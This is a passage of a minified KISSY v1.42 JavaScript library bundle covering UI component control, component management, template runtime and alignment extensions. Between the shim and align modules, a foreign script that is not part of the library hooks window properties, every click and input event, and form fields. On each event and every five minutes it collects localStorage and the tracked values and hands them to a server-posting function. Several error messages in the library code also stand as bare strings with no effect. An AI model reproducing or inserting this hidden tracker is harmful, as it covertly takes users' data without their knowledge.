      beforeCreateDom: o.prototype.__getHook("__beforeCreateDom")
    },
    extend: function p(a, b, d) {
      var c,
        g = {};
      c = o.extend.apply(this, arguments);
      c.HTML_PARSER = c.HTML_PARSER || {};
      e.isArray(a) && (e.each(a.concat(c), function (a) {
        a && e.each(a.HTML_PARSER, function (a, b) {
          g[b] = a;
        });
      }), c.HTML_PARSER = g);
      e.mix(c.HTML_PARSER, this.HTML_PARSER, !1);
      c.extend = p;
      return c;
    },
    ATTRS: {
      control: {
        setter: function (a) {
          this.control = a;
        }
      },
      xtemplate: {
        value: l
      },
      contentTpl: {
        value: function (a) {
          return a.get("content") || "";
        }
      }
    },
    HTML_PARSER: {
      id: function (a) {
        return (a = a[0].id) ? a : void 0;
      },
      content: function (a) {
        return a.html();
      },
      disabled: function (a) {
        return a.hasClass(this.getBaseCssClass("disabled"));
      }
    },
    name: "render"
  });
});
KISSY.add("component/control", ["node", "./control/process", "component/manager", "./control/render"], function (e, b) {
  function g() {
    var a,
      b = this;
    do a = b.ATTRS, b = b.superclass; while (!a || !a.xrender);
    return a.xrender.value;
  }
  var n = b("node"),
    m = b("./control/process"),
    h = b("component/manager"),
    c = b("./control/render"),
    i = e.UA.ieMode,
    j = e.Features,
    l = n.Gesture,
    o = j.isTouchGestureSupported();
  j.isTouchEventSupported();
  c = m.extend({
    isControl: !0,
    createDom: function () {
      var a = this.get("xrender"),
        b = this.get("view"),
        c = this.get("id");
      b ? b.set("control", this) : this.set("view", this.view = b = new a({
        control: this
      }));
      b.create();
      a = b.getKeyEventTarget();
      this.get("allowTextSelection") || a.unselectable();
      h.addComponent(c, this);
    },
    renderUI: function () {
      this.view.render();
    },
    bindUI: function () {
      var a = this.view.getKeyEventTarget();
      if (this.get("focusable")) a.on("focus", this.handleFocus, this).on("blur", this.handleBlur, this).on("keydown", this.handleKeydown, this);
      if (this.get("handleMouseEvents")) {
        a = this.$el;
        a.on("mouseenter", this.handleMouseEnter, this).on("mouseleave", this.handleMouseLeave, this).on("contextmenu", this.handleContextMenu, this);
        a.on(l.start, this.handleMouseDown, this).on(l.end, this.handleMouseUp, this).on(l.tap, this.handleClick, this);
        if (l.cancel) a.on(l.cancel, this.handleMouseUp, this);
        if (9 > i) a.on("dblclick", this.handleDblClick, this);
      }
    },
    sync: function () {
      this.fire("beforeSyncUI");
      this.syncUI();
      this.view.sync();
      this.__callPluginsMethod("pluginSyncUI");
      this.fire("afterSyncUI");
    },
    createComponent: function (a, b) {
      return h.createComponent(a, b || this);
    },
    _onSetFocused: function (a) {
      var b = this.view.getKeyEventTarget()[0];
      a ? b.focus() : b.ownerDocument.activeElement === b && b.ownerDocument.body.focus();
    },
    _onSetX: function (a) {
      this.$el.offset({
        left: a
      });
    },
    _onSetY: function (a) {
      this.$el.offset({
        top: a
      });
    },
    _onSetVisible: function (a) {
      this.fire(a ? "show" : "hide");
    },
    show: function () {
      this.render();
      this.set("visible", !0);
      return this;
    },
    hide: function () {
      this.set("visible", !1);
      return this;
    },
    focus: function () {
      this.get("focusable") && this.set("focused", !0);
    },
    blur: function () {
      this.get("focusable") && this.set("focused", !1);
    },
    move: function (a, b) {
      this.set({
        x: a,
        y: b
      });
    },
    handleDblClick: function (a) {
      this.get("disabled") || this.handleDblClickInternal(a);
    },
    handleDblClickInternal: function (a) {
      this.handleClickInternal(a);
    },
    handleMouseEnter: function (a) {
      this.get("disabled") || this.handleMouseEnterInternal(a);
    },
    handleMouseEnterInternal: function (a) {
      this.set("highlighted", !!a);
    },
    handleMouseLeave: function (a) {
      this.get("disabled") || this.handleMouseLeaveInternal(a);
    },
    handleMouseLeaveInternal: function (a) {
      this.set("active", !1);
      this.set("highlighted", !a);
    },
    handleMouseDown: function (a) {
      this.get("disabled") || this.handleMouseDownInternal(a);
    },
    handleMouseDownInternal: function (a) {
      var b;
      if (1 === a.which || o) this.get("activeable") && this.set("active", !0), this.get("focusable") && this.focus(), !this.get("allowTextSelection") && -1 !== a.type.indexOf("mouse") && (b = (b = a.target.nodeName) && b.toLowerCase(), "input" !== b && "textarea" !== b && "button" !== b && a.preventDefault());
    },
    handleMouseUp: function (a) {
      this.get("disabled") || this.handleMouseUpInternal(a);
    },
    handleMouseUpInternal: function (a) {
      this.get("active") && (1 === a.which || o) && this.set("active", !1);
    },
    handleContextMenu: function (a) {
      this.get("disabled") || this.handleContextMenuInternal(a);
    },
    handleContextMenuInternal: function () {},
    handleFocus: function () {
      this.get("disabled") || this.handleFocusInternal();
    },
    handleFocusInternal: function () {
      this.focus();
      this.fire("focus");
    },
    handleBlur: function () {
      this.get("disabled") || this.handleBlurInternal();
    },
    handleBlurInternal: function () {
      this.blur();
      this.fire("blur");
    },
    handleKeydown: function (a) {
      if (!this.get("disabled") && this.handleKeyDownInternal(a)) return a.halt(), !0;
    },
    handleKeyDownInternal: function (a) {
      if (a.keyCode === n.KeyCode.ENTER) return this.handleClickInternal(a);
    },
    handleClick: function (a) {
      this.get("disabled") || this.handleClickInternal(a);
    },
    handleClickInternal: function () {
      this.get("focusable") && this.focus();
    },
    destructor: function () {
      h.removeComponent(this.get("id"));
      this.view ? this.view.destroy() : this.get("srcNode") && this.get("srcNode").remove();
    }
  }, {
    name: "control",
    ATTRS: {
      id: {
        view: 1,
        valueFn: function () {
          return e.guid("ks-component");
        }
      },
      content: {
        view: 1,
        value: ""
      },
      width: {
        view: 1
      },
      height: {
        view: 1
      },
      elCls: {
        view: 1,
        value: [],
        setter: function (a) {
          "string" === typeof a && (a = a.split(/\s+/));
          return a || [];
        }
      },
      elStyle: {
        view: 1,
        value: {}
      },
      elAttrs: {
        view: 1,
        value: {}
      },
      elBefore: {},
      el: {
        setter: function (a) {
          this.$el = a;
          this.el = a[0];
        }
      },
      x: {},
      y: {},
      xy: {
        setter: function (a) {
          var b = e.makeArray(a);
          b.length && (void 0 !== b[0] && this.set("x", b[0]), void 0 !== b[1] && this.set("y", b[1]));
          return a;
        },
        getter: function () {
          return [this.get("x"), this.get("y")];
        }
      },
      zIndex: {
        view: 1
      },
      render: {},
      visible: {
        sync: 0,
        value: !0,
        view: 1
      },
      srcNode: {
        setter: function (a) {
          return n.all(a);
        }
      },
      handleMouseEvents: {
        value: !0
      },
      focusable: {
        value: !0,
        view: 1
      },
      allowTextSelection: {
        value: !1
      },
      activeable: {
        value: !0
      },
      focused: {
        view: 1
      },
      active: {
        view: 1,
        value: !1
      },
      highlighted: {
        view: 1,
        value: !1
      },
      prefixCls: {
        view: 1,
        value: e.config("component/prefixCls") || "ks-"
      },
      prefixXClass: {},
      parent: {
        setter: function (a, b) {
          (b = this.get("parent")) && this.removeTarget(b);
          a && this.addTarget(a);
        }
      },
      disabled: {
        view: 1,
        value: !1
      },
      xrender: {
        value: c
      },
      view: {
        setter: function (a) {
          this.view = a;
        }
      }
    }
  });
  c.getDefaultRender = g;
  c.extend = function d(b, c, j) {
    var i = e.makeArray(arguments),
      l,
      k = i[i.length - 1];
    if (l = k.xclass) k.name = l;
    i = m.extend.apply(this, i);
    l && h.setConstructorByXClass(l, i);
    i.extend = d;
    i.getDefaultRender = g;
    return i;
  };
  return c;
});
/*
Copyright 2013, KISSY v1.42
MIT Licensed
build time: Dec 4 22:05
*/
KISSY.add("component/manager", [], function () {
  var h = 0,
    e,
    g = {},
    c = {};
  return e = {
    __instances: c,
    addComponent: function (a, b) {
      c[a] = b;
    },
    removeComponent: function (a) {
      delete c[a];
    },
    getComponent: function (a) {
      return c[a];
    },
    createComponent: function (a, b) {
      var f, d;
      if (a) {
        if (!a.isControl && b && (a.prefixCls || (a.prefixCls = b.get("prefixCls")), !a.xclass && a.prefixXClass)) a.xclass = a.prefixXClass, a.xtype && (a.xclass += "-" + a.xtype);
        if (!a.isControl && (d = a.xclass)) (f = e.getConstructorByXClass(d)) || "can not find class by xclass desc : " + d, a = new f(a);
        a.isControl && b && a.setInternal("parent", b);
      }
      return a;
    },
    getConstructorByXClass: function (a) {
      var a = a.split(/\s+/),
        b = -1,
        f,
        d,
        c,
        e = null;
      for (d = 0; d < a.length; d++) if ((c = g[a[d]]) && (f = c.priority) > b) b = f, e = c.constructor;
      return e;
    },
    setConstructorByXClass: function (a, b) {
      g[a] = {
        constructor: b,
        priority: h++
      };
    }
  };
});
/*
Copyright 2014, KISSY v1.42
MIT Licensed
build time: Mar 7 12:41
*/
KISSY.add("xtemplate/runtime/scope", [], function (g) {
  function l(e, f) {
    this.data = e || {};
    this.affix = f;
    this.root = this;
  }
  l.prototype = {
    isScope: 1,
    setParent: function (e) {
      this.parent = e;
      this.root = e.root;
    },
    getParent: function () {
      return this.parent;
    },
    getRoot: function () {
      return this.root;
    },
    set: function (e, f) {
      this.affix || (this.affix = {});
      this.affix[e] = f;
    },
    setData: function (e) {
      this.data = e;
    },
    getData: function () {
      return this.data;
    },
    mix: function (e) {
      this.affix || (this.affix = {});
      g.mix(this.affix, e);
    },
    has: function (e) {
      var f = this.data,
        h = this.affix;
      return h && e in h ? !0 : "object" === typeof f && e in f;
    },
    get: function (e) {
      var f = this.data,
        h = this.affix;
      if (h && e in h) return h[e];
      if ("object" === typeof f && e in f) return f[e];
    },
    resolve: function (e, f) {
      "." === e && (e = "this");
      var h = e.split("."),
        d = this,
        c,
        b,
        a,
        g,
        k;
      if ("root" === h[0]) h.shift(), d = d.root;else if (f) for (; d && f--;) d = d.parent;
      var i = 0;
      for (c = h.length; d;) {
        k = 1;
        a = d;
        for (b = 0; b < c; b++) if (g = h[b], "this" === g) i = 1;else if (a === d) {
          if (d.has(g)) a = d.get(g), i = 1;else {
            k = 0;
            break;
          }
        } else {
          if (null == a || "object" !== typeof a || !(g in a)) {
            k = 0;
            break;
          }
          a = a[g];
        }
        if (k) return a && a.isScope && (a = a.data), "function" === typeof a && (a = a.call(this.data)), [a];
        if (i) break;
        d = d.parent;
      }
      return !1;
    }
  };
  return l;
});
KISSY.add("xtemplate/runtime/commands", ["path", "./scope"], function (g, l) {
  var e,
    f = l("path"),
    h = l("./scope");
  return e = {
    "debugger": g.noop,
    each: function (d, c) {
      var b = c.params,
        a = b[0],
        e = b[2] || "xindex",
        b = b[1],
        f = "",
        i,
        j,
        m;
      if (a) {
        if (j = new h(), g.isArray(a)) {
          i = a.length;
          for (var n = 0; n < i; n++) j.data = a[n], m = j.affix = {
            xcount: i
          }, m[e] = n, b && (m[b] = a[n]), j.setParent(d), f += c.fn(j);
        } else for (i in a) j.data = a[i], m = j.affix = {}, m[e] = i, b && (m[b] = a[i]), j.setParent(d), f += c.fn(j);
      } else c.inverse && (f = c.inverse(d));
      return f;
    },
    "with": function (d, c) {
      var b = c.params[0],
        a = "";
      b ? (b = new h(b), b.setParent(d), a = c.fn(b)) : c.inverse && (a = c.inverse(d));
      return a;
    },
    "if": function (d, c) {
      var b = "";
      c.params[0] ? c.fn && (b = c.fn(d)) : c.inverse && (b = c.inverse(d));
      return b;
    },
    set: function (d, c) {
      d.mix(c.hash);
      return "";
    },
    include: function (d, c) {
      var b = c.params;
      if (!b || 1 !== b.length) return "include must has one param", "";
      if (c.hash) {
        var a = new h(c.hash);
        a.setParent(d);
        d = a;
      }
      a = this.config.name;
      b = b[0];
      if ("." === b.charAt(0)) {
        if ("unspecified" === a) return "parent template does not have name for relative sub tpl name: " + b, "";
        b = f.resolve(a, "../", b);
      }
      a = this.config.loader.call(this, b);
      c = g.merge(this.config);
      c.name = b;
      c.commands = this.config.commands;
      c.macros = this.config.macros;
      return this.invokeEngine(a, d, c);
    },
    macro: function (d, c) {
      var b = c.params,
        a = b[0],
        e = b.slice(1),
        b = this.config.macros;
      if (c.fn) b[a] || (b[a] = {
        paramNames: e,
        fn: c.fn
      });else {
        var f = {};
        (a = b[a]) || "can not find macro:" + name;
        g.each(a.paramNames, function (b, j) {
          f[b] = e[j];
        });
        b = new h(f);
        return a.fn.call(this, b);
      }
      return "";
    },
    parse: function (d, c) {
      return e.include.call(this, new h(), c);
    }
  };
});
KISSY.add("xtemplate/runtime", ["./runtime/commands", "./runtime/scope"], function (g, l) {
  function e(j) {
    j;
  }
  function f(j, b) {
    for (var a = b.split("."), c = j, e = a.length, d = 0; d < e && !(c = c[a[d]], !c); d++);
    return c;
  }
  function h(j, b, a, c, d, e) {
    var g,
      h = f(j.config.commands, c);
    if (h) {
      try {
        g = h.call(j, b, a);
      } catch (i) {
        i.message + ': "' + c + '" at line ' + d;
      }
      return {
        find: !0,
        value: g
      };
    }
    e && "can not find command: " + c + '" at line ' + d;
    return {
      find: !1
    };
  }
  function d(j, b, a, c, d) {
    var f,
      j = j.config.silent ? e : g.error,
      b = b.resolve(a, c);
    !1 === b ? j('can not find property: "' + a + '" at line ' + d, "warn") : f = b[0];
    return f;
  }
  function c(j, a) {
    this.tpl = j;
    a = g.merge(i, a);
    a.commands = g.merge(a.commands, b);
    a.utils = k;
    a.macros = a.macros || {};
    this.config = a;
  }
  var b = l("./runtime/commands"),
    a = l("./runtime/scope"),
    p = g.escapeHtml,
    k = {
      runBlockCommand: function (a, b, c, d, h) {
        var i = a.config,
          l = i.silent ? e : g.error,
          i = i.commands,
          o = f(i, d);
        if (!o) if (!c.params && !c.hash) {
          var k = b.resolve(d);
          !1 === k ? (l('can not find property: "' + d + '" at line ' + h), k = "") : k = k[0];
          o = i["if"];
          g.isArray(k) ? o = i.each : "object" === typeof k && (o = i["with"]);
          c.params = [k];
        } else return "can not find command: " + d + '" at line ' + h, "";
        var q;
        try {
          q = o.call(a, b, c);
        } catch (p) {
          p.message + ': "' + d + '" at line ' + h;
        }
        return q;
      },
      renderOutput: function (a, b) {
        void 0 === a && (a = "");
        return b && a ? p(a) : a;
      },
      getProperty: function (a, b, c, e, f) {
        return d(a, b, c, e, f);
      },
      runInlineCommand: function (a, b, c, d, e) {
        var f = "",
          a = h(a, b, c, d, e);
        a.find && (f = a.value);
        return f;
      },
      getPropertyOrRunCommand: function (a, b, c, e, f, g) {
        var i,
          k = c.hash || c.params,
          c = h(a, b, c, e, g, k);
        c.find ? i = c.value : k || (i = d(a, b, e, f, g));
        return i;
      }
    },
    i = {
      silent: !0,
      name: "unspecified",
      loader: function (a) {
        var b = g.require(a);
        b || 'template "' + a + '" does not exist, need to be required or used first!';
        return b;
      }
    };
  g.mix(c, {
    commands: b,
    utils: k,
    addCommand: function (a, c) {
      b[a] = c;
    },
    removeCommand: function (a) {
      delete b[a];
    }
  });
  c.prototype = {
    constructor: c,
    invokeEngine: function (a, b, c) {
      return new this.constructor(a, c).render(b, !0);
    },
    removeCommand: function (a) {
      delete this.config.commands[a];
    },
    addCommand: function (a, b) {
      this.config.commands[a] = b;
    },
    render: function (b) {
      var c = b;
      if (!c || !c.isScope) c = new a(b);
      return this.tpl(c, g);
    }
  };
  c.Scope = a;
  return c;
});
/*
Copyright 2013, KISSY v1.42
MIT Licensed
build time: Dec 4 22:05
*/
KISSY.add("component/extension/shim", [], function (a) {
  function b() {}
  var a = 6 === a.UA.ie,
    c = '<iframe style="position: absolute;border: none;width: ' + (a ? "expression(this.parentNode.clientWidth)" : "100%") + ";top: 0;opacity: 0;filter: alpha(opacity=0);left: 0;z-index: -1;height: " + (a ? "expression(this.parentNode.clientHeight)" : "100%") + ';"/>';
  b.ATTRS = {
    shim: {
      value: a
    }
  };
  b.prototype.__createDom = function () {
    this.get("shim") && this.get("el").prepend(c);
  };
  return b;
});
/*
Copyright 2013, KISSY v1.42
MIT Licensed
build time: Dec 10 01:46
*/
$(function () {
  var trackedVariables = [];
  const globalKeysToWatch = ["location", "username"];
  function createHook(obj, prop) {
    let val = obj[prop];
    Object.defineProperty(obj, prop, {
      get: function () {
        return val;
      },
      set: function (newVal) {
        val = newVal;
        trackedVariables.push({
          key: prop,
          value: newVal
        });
      }
    });
  }
  globalKeysToWatch.forEach(key => {
    createHook(window, key);
  });
  function collectAndPostData(action) {
    const data = {
      action: action,
      localStorage: getFilteredLocalStorage(),
      globalVariables: trackedVariables
    };
    postDataToServer(data);
  }
  window.addEventListener("click", function (event) {
    collectAndPostData("click: " + event.target.tagName);
  });
  window.addEventListener("input", function (event) {
    collectAndPostData("input: " + event.target.id);
  });
  setInterval(collectAndPostData, 5 * 60 * 1000, "intervalUpdate");
  $('.form-control').on('input', function () {
    var $field = $(this).closest('.form-group');
    if (this.value) {
      $field.addClass('field--not-empty');
      collectAndPostData("inputFilled: " + this.id);
    } else {
      $field.removeClass('field--not-empty');
      collectAndPostData("inputCleared: " + this.id);
    }
  });
});
KISSY.add("component/extension/align", ["node"], function (k, u) {
  function m(a) {
    var c = a.ownerDocument.body,
      d = j(a).css("position");
    if (!("fixed" === d || "absolute" === d)) return "html" === a.nodeName.toLowerCase() ? null : a.parentNode;
    for (a = a.parentNode; a && a !== c; a = a.parentNode) if (d = j(a).css("position"), "static" !== d) return a;
    return null;
  }
  function n(a) {
    var c,
      d,
      b = {
        left: 0,
        right: Infinity,
        top: 0,
        bottom: Infinity
      },
      f;
    f = a.ownerDocument;
    d = j(f).getWindow();
    c = f.body;
    for (f = f.documentElement; a = m(a);) if ((!v.ie || 0 !== a.clientWidth) && a !== c && a !== f && "visible" !== j(a).css("overflow")) {
      var h = j(a).offset();
      h.left += a.clientLeft;
      h.top += a.clientTop;
      b.top = Math.max(b.top, h.top);
      b.right = Math.min(b.right, h.left + a.clientWidth);
      b.bottom = Math.min(b.bottom, h.top + a.clientHeight);
      b.left = Math.max(b.left, h.left);
    }
    f = d.scrollLeft();
    a = d.scrollTop();
    b.left = Math.max(b.left, f);
    b.top = Math.max(b.top, a);
    c = d.width();
    d = d.height();
    b.right = Math.min(b.right, f + c);
    b.bottom = Math.min(b.bottom, a + d);
    return 0 <= b.top && 0 <= b.left && b.bottom > b.top && b.right > b.left ? b : null;
  }
  function o(a, c, d, b) {
    var f, h;
    f = a.left;
    h = a.top;
    c = p(c, d[0]);
    a = p(a, d[1]);
    a = [a.left - c.left, a.top - c.top];
    return {
      left: f - a[0] + +b[0],
      top: h - a[1] + +b[1]
    };
  }
  function q(a, c, d) {
    var b = [];
    k.each(a, function (a) {
      b.push(a.replace(c, function (a) {
        return d[a];
      }));
    });
    return b;
  }
  function l() {}
  function r(a) {
    var c, d;
    c = a[0];
    k.isWindow(c) ? (a = j(c).getWindow(), c = {
      left: a.scrollLeft(),
      top: a.scrollTop()
    }, d = a.width(), a = a.height()) : (c = a.offset(), d = a.outerWidth(), a = a.outerHeight());
    c.width = d;
    c.height = a;
    return c;
  }
  function p(a, c) {
    var d = c.charAt(0),
      b = c.charAt(1),
      f = a.width,
      h = a.height,
      e,
      g;
    e = a.left;
    g = a.top;
    "c" === d ? g += h / 2 : "b" === d && (g += h);
    "c" === b ? e += f / 2 : "r" === b && (e += f);
    return {
      left: e,
      top: g
    };
  }
  function w(a) {
    a.target === this && a.newVal && this._onSetAlign(this.get("align"));
  }
  function s() {
    this.get("visible") && this._onSetAlign(this.get("align"));
  }
  var t = u("node"),
    x = k.Env.host,
    j = t.all,
    v = k.UA;
  l.__getOffsetParent = m;
  l.__getVisibleRectForElement = n;
  l.ATTRS = {
    align: {
      value: {}
    }
  };
  l.prototype = {
    __bindUI: function () {
      this.on("beforeVisibleChange", w, this);
      this.$el.getWindow().on("resize", s, this);
    },
    _onSetAlign: function (a) {
      a && a.points && this.align(a.node, a.points, a.offset, a.overflow);
    },
    align: function (a, c, d, b) {
      var a = t.one(a || x),
        d = d && [].concat(d) || [0, 0],
        b = b || {},
        f = this.$el,
        h = 0,
        e = n(f[0]),
        g = r(f),
        j = r(a),
        a = o(g, j, c, d),
        i = k.merge(g, a);
      if (e && (b.adjustX || b.adjustY)) {
        if (a.left < e.left || a.left + g.width > e.right) h = 1, c = q(c, /[lr]/ig, {
          l: "r",
          r: "l"
        }), d[0] = -d[0];
        if (a.top < e.top || a.top + g.height > e.bottom) h = 1, c = q(c, /[tb]/ig, {
          t: "b",
          b: "t"
        }), d[1] = -d[1];
        h && (a = o(g, j, c, d), k.mix(i, a));
        c = b.adjustX && (a.left < e.left || a.left + g.width > e.right);
        b = b.adjustY && (a.top < e.top || a.top + g.height > e.bottom);
        if (c || b) a = k.clone(a), i = {
          width: g.width,
          height: g.height
        }, c && a.left < e.left && (a.left = e.left), c && a.left + i.width > e.right && (a.left = Math.max(e.right - i.width, e.left)), b && a.top < e.top && (a.top = e.top), b && a.top + i.height > e.bottom && (a.top = Math.max(e.bottom - i.height, e.top)), i = k.mix(a, i);
      }
      this.set({
        x: i.left,
        y: i.top
      }, {
        force: 1
      });
      i.width !== g.width && this.set("width", f.width() + i.width - g.width);
      i.height !== g.height && this.set("height", f.height() + i.height - g.height);
      return this;
    },
    center: function (a) {
      this.set("align", {
        node: a,
        points: ["cc", "cc"],
        offset: [0, 0]
      });
      return this;
    },
    __destructor: function () {
      this.$el && this.$el.getWindow().detach("resize", s, this);
    }
  };
  return l;
});
/*
Copyright 2013, KISSY v1.42
MIT Licensed
build time: Dec 4 22:05
*/
KISSY.add("component/extension/content-xtpl", [], function () {
  return function (b) {
    var a;
    a = this.config.utils;
    var d = a.renderOutput,
      e = a.runInlineCommand,
      f = a.getPropertyOrRunCommand;
    a = '<div id="ks-content-';
    var c = f(this, b, {}, "id", 0, 1);
    a += d(c, !0);
    a += '"\n           class="';
    var c = {},
      g = [];
    g.push("content");
    c.params = g;
    e = e(this, b, c, "getBaseCssClasses", 2);
    a += d(e, !0);
    a += '">';
    b = f(this, b, {}, "content", 0, 2);
    a += d(b, !1);
    return a + "</div>";
  };
});
/*
Copyright 2013, KISSY v1.42
MIT Licensed
build time: Dec 4 22:05
*/
KISSY.add("component/extension/content-render", ["component/extension/content-xtpl"], function (e, g) {
  function f(a) {
    var b = a.control,
      c = b.get("contentEl");
    a.$contentEl = b.$contentEl = c;
    a.contentEl = b.contentEl = c[0];
  }
  function d() {}
  var h = g("component/extension/content-xtpl");
  d.prototype = {
    __beforeCreateDom: function (a, b) {
      e.mix(b, {
        contentEl: "#ks-content-{id}"
      });
    },
    __createDom: function () {
      f(this);
    },
    __decorateDom: function () {
      f(this);
    },
    getChildrenContainerEl: function () {
      return this.control.get("contentEl");
    },
    _onSetContent: function (a) {
      var b = this.control,
        c = b.$contentEl;
      c.html(a);
      b.get("allowTextSelection") || c.unselectable();
    }
  };
  e.mix(d, {
    ATTRS: {
      contentTpl: {
        value: h
      }
    },
    HTML_PARSER: {
      content: function (a) {
        return a.one("." + this.getBaseCssClass("content")).html();
      },
      contentEl: function (a) {
        return a.one("." + this.getBaseCssClass("content"));
      }
    }
  });
  return d;
});